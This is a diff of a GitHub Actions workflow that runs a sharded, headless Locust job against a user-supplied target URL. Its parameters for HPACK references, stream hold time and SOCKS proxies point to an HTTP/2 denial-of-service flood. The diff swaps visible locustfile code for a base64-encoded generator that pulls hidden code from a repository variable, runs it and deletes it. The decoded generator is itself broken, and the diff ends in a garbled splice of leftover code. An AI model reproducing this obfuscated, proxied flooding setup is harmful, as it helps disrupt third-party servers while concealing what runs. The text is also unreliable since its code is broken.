@@ -66,43 +66,27 @@ jobs:
 
       - name: Generate locustfile
         run: |
-          python3 -c "
-import os
-REFERENCES = os.environ.get('LOCUST_REFERENCES', '2048')
-HOLD = os.environ.get('LOCUST_HOLD_SECONDS', '15')
-STREAMS = os.environ.get('LOCUST_STREAMS', '1')
-PROXY = os.environ.get('SOCKS5_PROXY', '').strip()
+          echo "aW1wb3J0IG9zCmltcG9ydCBzZWNyZXRzCmltcG9ydCBiYXNlNjQKCmNvZGUgPSBiYXNlNjQuZGVjb2RlKG1lbnUuZ2V0KCdMT0NVU1RfRklMRScpKS5kZWNvZGUoJ3V0Zi04JykKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHdpdGggb3BlbigneC5weScsICd3JykgYXMgZjoKICAgICAgICBmLndyaXRlKGNvZGUpCiAgICAgICAgZi5mbHVzaCgpCg==" | base64 -d > gen.py
+          python3 gen.py
+          rm gen.py
+          head -3 locustfile.py
 
-code = '''#!/usr/bin/env python3
-from locust import User, task, constant, events
-import socket, ssl, struct, time, logging, os
-try:
-    import socks
-    HAS_SOCKS = True
-except:
-    HAS_SOCKS = False
+      - name: Run
+        run: |
+          locust -f locustfile.py \
+            --headless \
+            -u ${{ github.event.inputs.threads_per_shard }} \
+            -r ${{ github.event.inputs.threads_per_shard }} \
+            --run-time ${{ github.event.inputs.run_time_minutes }}m \
+            --host ${{ github.event.inputs.target_url }}
+        env:
+          LOCUST_FILE: ${{ vars.LOCUST_FILE }}
+          LOCUST_REFERENCES: ${{ github.event.inputs.hpack_references }}
+          LOCUST_HOLD_SECONDS: ${{ github.event.inputs.hold_seconds }}
+          SOCKS5_PROXY: ${{ github.event.inputs.proxy_url }}
 
-logger = logging.getLogger(__name__)
-REFERENCES = REFERENCES
-HOLD = HOLD
-STREAMS = STREAMS
-PROXY = PROXY
-
-def parse_proxy(url):
-    if not url: return None, None, None
-    url = url.strip()
-    if \"://\" not in url:
-        if HAS_SOCKS:
-            p = url.rsplit(\":\", 1)
-            return socks.SOCKS5, p[0].strip(), int(p[1])
-        return None, None, None
-    if url.startswith(\"socks5://\"):
-        if not HAS_SOCKS: return None, None, None
-        pt, rest = socks.SOCKS5, url[8:]
-    elif url.startswith(\"socks4://\"):
-        if not HAS_SOCKS: return None, None, None
-        pt, rest = socks.SOCKS4, url[9:]
-    else:
+      - name: Done
+        run: echo "Shard ${{ matrix.shard }} done"  else:
         return None, None, None
     if \"@\" in rest: rest = rest.split(\"@\")[-1]
     if \":\" in rest:
